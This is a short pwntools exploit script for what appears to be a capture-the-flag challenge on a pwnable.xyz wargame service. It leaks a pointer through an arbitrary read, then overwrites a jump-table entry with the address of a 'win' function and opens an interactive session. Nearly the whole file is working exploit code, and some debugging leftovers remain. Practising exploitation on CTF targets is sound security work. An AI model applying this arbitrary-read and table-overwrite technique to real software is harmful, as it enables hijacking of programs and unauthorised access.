from pwn import *

LOCAL = False
if LOCAL:
    r = process('./challenge')
else:
    r = remote('svc.pwnable.xyz', 30019)
r.sendlineafter("> ", "1") # perform a read
stdin = 0x00601020
stdin = 0x601020+217 # 0x601100 + 216, why isn't this memory readable? 
r.sendafter(": ", str(stdin))
jumps_addr = int.from_bytes(r.recvline()[:-1], byteorder='little') * 256
print(hex(jumps_addr))


gdb.attach(r)
win = 0x00400905
jumps_addr += (8*7)
print("writing: ", hex(jumps_addr))
r.sendlineafter("> ", "2")
r.sendafter(": ", str(jumps_addr)) 
r.sendafter(": ", str(win))

r.interactive()

